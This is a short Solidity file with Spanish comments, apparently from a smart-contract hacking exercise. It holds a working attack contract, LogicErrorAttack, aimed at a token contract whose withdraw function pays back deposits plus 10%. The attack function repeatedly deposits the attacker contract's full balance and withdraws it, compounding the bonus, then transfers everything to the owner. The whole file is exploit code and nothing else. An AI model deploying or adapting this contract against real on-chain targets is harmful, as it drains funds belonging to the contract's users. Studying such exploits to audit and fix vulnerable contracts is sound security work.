// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITokenLogicError {
    function deposit() external payable;
    function withdraw() external;
}

contract LogicErrorAttack {
    // Variables
    ITokenLogicError public target;
    address public owner;

    // Constructor
    constructor(address _target) {
        target = ITokenLogicError(_target);
        owner = msg.sender;
    }

    // Función de ataque
    function attack(uint rounds) external payable {
        require(msg.sender == owner, "Not the Owner");
        require(msg.value > 0, "Need some Credits to start");


        // Repetir ciclo de depositar + retirar con interés
        for (uint i = 0; i < rounds; i++) {
            target.deposit{value: address(this).balance}(); // Vuelve a depositar todo
            target.withdraw();                          // Recibe capital + 10%
        }

        payable(owner).transfer(address(this).balance);
    }

    // Recivir creditos
    receive() external payable {}
}